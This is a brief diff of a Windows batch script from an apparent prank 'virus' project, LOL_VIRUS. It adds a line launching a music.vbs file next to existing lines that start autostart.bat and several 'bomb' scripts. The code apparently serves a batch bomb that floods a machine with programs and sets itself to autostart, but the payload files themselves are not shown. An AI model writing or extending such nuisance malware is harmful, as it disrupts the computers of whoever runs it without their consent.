@@ -8,6 +8,7 @@ goto startall
 
 :startall
 cls
+start C:\LOL_VIRUS\files\music\music.vbs
 start C:\LOL_VIRUS\files\bomb\autostart.bat
 start C:\LOL_VIRUS\files\bomb\calc.bat
 start C:\LOL_VIRUS\files\bomb\iexplore.bat
